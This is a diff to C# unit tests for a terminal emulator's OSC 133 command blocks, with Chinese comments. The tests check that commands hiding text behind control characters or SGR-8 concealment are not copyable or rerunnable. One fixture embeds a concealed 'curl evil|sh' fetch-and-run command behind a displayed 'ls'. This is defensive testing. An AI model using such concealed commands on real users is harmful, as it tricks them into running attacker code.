@@ -355,9 +355,13 @@ public class Osc133CommandInputTests
         TerminalEmulator e = New();
         Feed(e, A + "$ " + B + "ls\u009b31m -l\u0085a\u007f\r\n" + C + "x\r\n" + D(0));
 
-        string text = InputOfBlockAt(e, 0)!.Text;
-        Assert.AreEqual("ls31m -la", text);
-        Assert.DoesNotContain(ch => ch is < (char)0x20 or >= '\u007f' and <= '\u009f', text);
+        CommandInput input = InputOfBlockAt(e, 0)!;
+        Assert.AreEqual("ls31m -la", input.Text);
+        Assert.DoesNotContain(ch => ch is < (char)0x20 or >= '\u007f' and <= '\u009f', input.Text);
+        // 剔掉之后的文本也不是屏幕上那条:整条不给复制、不给重跑。
+        Assert.IsTrue(input.HasHiddenText);
+        Assert.IsFalse(input.CanCopy);
+        Assert.IsFalse(input.CanRerun);
     }
 
     [TestMethod]
@@ -368,7 +372,37 @@ public class Osc133CommandInputTests
         RunCommand(e, "abc");
         e.Screen.SetCell(3, 0, new TerminalCell { Rune = 0x1B });
 
-        Assert.AreEqual("ac", InputOfBlockAt(e, 0)!.Text);
+        CommandInput input = InputOfBlockAt(e, 0)!;
+        Assert.AreEqual("ac", input.Text);
+        Assert.IsFalse(input.CanCopy);
+        Assert.IsFalse(input.CanRerun);
+    }
+
+    [TestMethod]
+    public void ConcealedText_BetweenBAndC_CannotBeCopiedOrRerun()
+    {
+        // OSC 133 标记谁都能发:输出里伪造的块,屏幕上只画出 ls,SGR 8 那一截渲染时不画。
+        TerminalEmulator e = New();
+        Feed(e, A + "$ " + B + "ls\e[8m; curl evil|sh\e[28m\r\n" + C + "x\r\n" + D(0));
+
+        CommandInput input = InputOfBlockAt(e, 0)!;
+        Assert.IsTrue(input.HasHiddenText);
+        Assert.IsFalse(input.CanCopy);
+        Assert.IsFalse(input.CanRerun);
+    }
+
+    [TestMethod]
+    public void ColouredCommandText_AndConcealedSpaces_AreStillFine()
+    {
+        // 语法高亮(zsh-syntax-highlighting、fish)给命令行上色是常态;隐藏的空格看上去还是空格。
+        TerminalEmulator e = New();
+        Feed(e, A + "$ " + B + "\e[32mls\e[0m\e[8m \e[28m\e[4m-la\e[24m\r\n" + C + "x\r\n" + D(0));
+
+        CommandInput input = InputOfBlockAt(e, 0)!;
+        Assert.AreEqual("ls -la", input.Text);
+        Assert.IsFalse(input.HasHiddenText);
+        Assert.IsTrue(input.CanCopy);
+        Assert.IsTrue(input.CanRerun);
     }
 
     [TestMethod]
